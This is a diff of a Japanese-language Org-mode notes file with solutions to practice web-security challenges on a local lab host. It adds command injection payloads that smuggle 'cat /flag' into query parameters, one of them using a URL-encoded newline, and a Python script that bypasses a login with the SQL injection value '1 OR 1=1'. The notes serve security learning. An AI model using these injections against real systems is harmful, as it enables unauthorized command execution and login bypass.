@@ -178,3 +178,41 @@ curl "http://challenge.localhost/event?time-zon=;cat</flag;"
 #+begin_src shell
 curl "http://challenge.localhost/activity?file-loc=empty.txt;cat%20/flag%20>%20flag";cat flag
 #+end_src
+
+* CMDi 6
+だいたいの文字が弾かれるようになっているので、改行で区切る。
+
+#+begin_src shell
+curl "http://challenge.localhost/goal?subdirectory=%0acat%20/flag"
+#+end_src
+* TODO Authentication Bypass 1
+* TODO Authentication Bypass 2
+* SQLi 1
+とりあえず python でスクリプトを組んだ。
+
+#+begin_src python :eval no
+#!/usr/bin/env python
+
+import requests
+
+url = "http://challenge.localhost/authenticate"
+
+session = requests.Session()
+
+payload = {
+    "identity": "admin",
+    "pin": "1 OR 1=1"
+}
+
+try:
+    response = session.post(url, data=payload)
+    print(response.text)
+except:
+    print("Error")
+#+end_src
+
+#+begin_src shell
+python exploit.py | grep 'flag'
+#+end_src
+
+（実行はリモートサーバー上で）
